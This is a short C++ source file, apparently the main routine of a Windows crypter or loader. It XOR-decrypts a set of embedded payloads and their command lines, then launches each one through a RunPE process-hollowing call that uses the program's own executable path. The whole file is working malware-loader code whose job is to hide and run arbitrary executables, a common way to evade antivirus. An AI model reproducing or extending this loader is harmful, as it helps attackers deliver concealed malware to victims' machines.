#include <windows.h>
#include <stdio.h>
#include "runPE.h"
#include "payloads.h"


int main() {
	TCHAR szFilePath[1024];
	
	// Retrieve path to current module
	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
	
	// Iterate payloads
	for(int i=0; i < payloadCount; i++) {	
		// Decrypt payload before instanciation
		for(int j=0; j < payloadSizes[i]; j++) {
			payloads[i][j] = payloads[i][j] ^ keys[i];
		}
		
		// Decrypt the payload's command line before instanciation
		for(int j=0; j < commandLineSizes[i]; j++) {
			commandLines[i][j] = commandLines[i][j] ^ keys[i];
		}
				
		// Spawn payloads as runPE
		printf("\n Spawning payload %d, command line is '%s'\n", i, (char *) commandLines[i]);		
		newRunPE(LPSTR(szFilePath), payloads[i], LPTSTR(commandLines[i]));			
	}
		
	return 0;
}	